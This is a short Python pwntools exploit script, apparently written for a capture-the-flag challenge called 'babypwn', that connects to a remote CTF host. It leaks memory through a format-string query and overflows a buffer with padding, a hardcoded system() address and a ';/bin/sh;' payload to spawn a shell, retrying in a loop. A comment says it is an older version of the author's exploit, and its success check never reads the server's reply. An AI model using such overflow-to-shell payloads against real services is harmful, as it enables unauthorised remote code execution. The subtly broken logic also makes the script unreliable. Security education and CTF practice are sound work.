from pwn import *

target = 0x8048dbd
def format(dicc):
	r = remote("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1234)
	#r = process("./babypwn", env={"LD_PRELOAD":"./babylibc"})
	r.recvuntil("3. StrRemoveLastSymbols")
	r.sendline("3")
	r.recvuntil("Set string:")
	r.sendline(dicc)
	r.recvuntil("Set number:")
	r.sendline("0")
	#r.interactive()
	r.recvuntil("Result")
	r.recvline()
	ret = r.recvline()
	
	r.close()
	return ret

def bof():
	#r = process("./babypwn")
	r = remote("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1234)
	r.recvuntil("3. StrRemoveLastSymbols")
	r.sendline("X")
	r.recvuntil("or n)")
	#I DELETED MY ACTUAL EXPLOIT, SO HERES AN OLDER VERSION
	#ACTUAL ONE IS JUST ADD SHELLCODE AND JMP TO SHELLCODE
	r.sendline("A"*(256) + p32(0xf7631da0) + "y;/bin/sh;")
	r.sendline("echo 'hacked'")
	ret = ""
	try:
		r.recvuntil("hacked", timeout=2)
	except:
		pass
	if "hacked" in ret:
		print "WIN"
		r.interactive()
	else:
		r.close()

putsgot = 0x804B028
system = 0xf7631da0

while True:
	bof()
#ret = format("%9$s{}".format(p32(putsgot)))
#print hex(struct.unpack("I", ret[:4])[0])
